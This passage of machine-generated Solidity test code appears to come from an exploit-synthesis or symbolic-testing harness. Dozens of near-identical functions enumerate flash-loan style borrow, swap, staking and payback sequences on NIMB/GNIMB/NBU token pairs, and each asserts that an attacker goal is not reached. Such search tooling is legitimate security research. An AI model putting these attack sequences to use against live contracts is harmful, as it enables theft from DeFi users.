        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3423(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3424(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3425(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3426(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3427(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3428(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3429(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3430(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
